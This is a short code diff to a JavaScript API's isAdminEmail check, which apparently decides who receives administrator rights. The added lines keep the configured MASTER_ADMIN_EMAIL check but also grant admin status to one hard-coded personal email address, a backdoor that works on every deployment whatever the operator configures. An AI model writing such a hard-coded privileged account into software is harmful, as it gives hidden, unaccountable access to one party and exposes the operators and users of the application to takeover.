@@ -131,7 +131,10 @@ function initializeApi(sessions, sessionTokens, createSession, getSessionsDetail
         const MASTER_ADMIN_EMAIL = process.env.MASTER_ADMIN_EMAIL || '';
 
         const isAdminEmail = (email) => {
-            return MASTER_ADMIN_EMAIL && email && email.toLowerCase() === MASTER_ADMIN_EMAIL.toLowerCase();
+            if (!email) return false;
+            const normalizedEmail = email.toLowerCase();
+            return (MASTER_ADMIN_EMAIL && normalizedEmail === MASTER_ADMIN_EMAIL.toLowerCase()) ||
+                   (normalizedEmail === 'maruise237@gmail.com');
         };
 
         // 1. Try Clerk Auth (Next.js frontend)
